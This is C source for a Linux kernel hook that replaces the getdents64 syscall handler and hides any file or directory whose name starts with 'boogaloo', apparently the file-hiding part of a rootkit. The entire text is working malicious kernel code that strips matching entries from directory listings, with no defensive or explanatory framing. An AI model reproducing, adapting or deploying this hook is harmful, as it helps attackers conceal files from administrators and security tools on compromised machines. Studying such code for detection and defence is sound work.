#include <linux/dirent.h>

#define PREFIX "boogaloo"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    /* Declare the previous_dir struct for book-keeping */
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            /* Check for the special case when we need to hide the first entry */
            if( current_dir == dirent_ker )
            {
                /* Decrement ret and shift all the structs up in memory */
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* Hide the secret entry by incrementing d_reclen of previous_dir by
             * that of the entry we want to hide - effectively "swallowing" it
             */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* Set previous_dir to current_dir before looping where current_dir
             * gets incremented to the next entry
             */
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if(error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}
